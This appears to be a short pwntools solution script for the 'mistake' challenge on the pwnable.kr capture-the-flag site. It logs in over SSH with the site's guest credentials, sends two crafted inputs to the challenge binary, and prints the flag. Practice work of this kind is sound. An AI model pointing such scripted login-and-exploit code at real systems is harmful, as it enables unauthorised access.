from pwn import *
from time import sleep

context(arch='amd64', os='linux', log_level='error')

sh = ssh('mistake', 'pwnable.kr', password='guest', port=2222)

p = sh.process('mistake')


p.recv()
p.sendline(b'bbbbbbbbbb')

p.recv()
p.sendline(b'cccccccccc')

p.recvline()
flag = p.recv()
print(flag)

